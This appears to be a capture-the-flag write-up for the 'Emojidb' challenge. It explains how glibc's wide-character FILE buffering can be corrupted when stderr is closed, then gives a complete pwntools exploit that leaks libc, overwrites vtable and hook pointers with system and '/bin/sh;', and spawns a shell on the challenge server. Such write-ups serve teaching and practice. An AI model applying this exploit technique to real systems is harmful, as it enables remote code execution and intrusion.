<h1>Emojidb</h1>

I will write up on the premise that  `dword_2020E0` has a value. 

I exploited Emojidb with analyzed result below. It could be wrong

First, before calling `_IO_wdo_write` , `_IO_wfile_xsputn` copies data to `_wide_data->_IO_write_ptr (short_buf)`

After \_IO\_wdo\_write , It is supposed to rearrange write_base,write_end,.. of `_wide_data`  <strong>except fail to print data. </strong>

```C
int
_IO_wdo_write (_IO_FILE *fp, const wchar_t *data, _IO_size_t to_do)
{ 
	if (_IO_new_do_write (fp, write_base, write_ptr - write_base) == EOF)
	    /* Something went wrong.  */
	    return WEOF;
...
...
   fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr
    = fp->_wide_data->_IO_buf_base;
  fp->_wide_data->_IO_write_end = ((fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
				   ? fp->_wide_data->_IO_buf_base
				   : fp->_wide_data->_IO_buf_end);

  return to_do == 0 ? 0 : WEOF;
}
```



I said ` _IO_wfile_xsputn` copies data to `_IO_write_ptr`. 

```C
_IO_size_t
_IO_wfile_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const wchar_t *s = (const wchar_t *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count;
  ...
  
  count = f->_wide_data->_IO_write_end - f->_wide_data->_IO_write_ptr;
  
  ...
  ...
	/* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
	count = to_do;
      if (count > 20)
	{
	  f->_wide_data->_IO_write_ptr =
	    __wmempcpy (f->_wide_data->_IO_write_ptr, s, count);
	  s += count;
	}
      else
	{
	  wchar_t *p = f->_wide_data->_IO_write_ptr;
	  int i = (int) count;
	  while (--i >= 0)
	    *p++ = *s++;
	  f->_wide_data->_IO_write_ptr = p;
	}
      to_do -= count;
    }
  
```



1. `_IO_write_ptr` will be increased by size of data. 
2. `_IO_new_do_write` returns EOF because stderr is closed by run.sh
3. So \_IO\_wdo\_write doesn't rearrange `_IO_FILE` section of  `_wide_data` , but `_IO_write_ptr` is already increased.
4. After `__fwprintf_chk(stderr, 1LL, &off_1038, v4);` , \_IO\_write\_ptr is bigger than \_IO\_write\_end
5. `count` type of `_IO_wfile_xsputn` is `_IO_size_t (size_t , unsigned long)` . Next time the function is called , `count = f->_wide_data->_IO_write_end - f->_wide_data->_IO_write_ptr;` is not negative and we can pass the `if (count > 0)` condition.
6. Overwrite payload from `_wide_data->short_buf` to ` _wide_vtable`
7. Lastly If ` _wide_vtable`  was overwritten with system, Send wrong unicode data. 
8. Get shell



```python
#-*- coding: utf-8 -*-
from pwn import *
from ctypes import *
import os

lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#p = process("/home/ctf/run.sh")
#p = remote("192.168.123.228",9876))
p = remote("emojidb.pwni.ng",9876)


lib.setlocale(0,"en_US.UTF-8")

go = lambda x : p.sendafter("❓",str(x))
go2 = lambda x : p.sendlineafter("❓",str(x))
goi = lambda x : p.sendlineafter("🔢❓",str(x))

def decode(array) :
    ptr = create_string_buffer(len(array)*4)
    lib.mbstowcs(ptr,array,len(array)*4)
    return ptr.value

def encode(array) :
    ptr = create_string_buffer(len(array)*4)
    lib.wcstombs(ptr,array,len(array)*4)
    return ptr.value

def new(size,content) :
    go2('🆕')
    go(size)
    p.sendline(content)

def free(idx) :
    go2('🆓')
    goi(idx)

def view(idx) :
    go2('📖')
    goi(idx)

new(0x110,"")
new(0x3,encode("A"*0x10))
free(1)

view(1)

a = p.recvuntil("🆕")[:-4]

print hexdump(a)
leak = decode(a)
if len(leak) < 3 :
    print("retry")
    quit()

libc = u64(leak+"\x00\x00") - 0x3ebca0

print 'libc : ' + hex(libc)

new(0x3,encode("B"))

free(2)
free(1)

view(1)

new(3,"A")
new(3,"A")
new(3,"A")
new(3,"A")
new(3,"A")

payload = "A"*8
payload += "C" *4 + p64(libc+0x3ec860) * 2 #mallochook

p.sendline(encode("AAAA"))
p.sendline(encode("AAAA"))
p.sendline(encode("AAAA"))

p.sendline(encode(payload))

p.sendline(encode("A"*0x3c+"/bin/sh;"+p64(libc+0x4f440)*2))

p.sendline("\xf3X\xf3")

p.interactive()
```

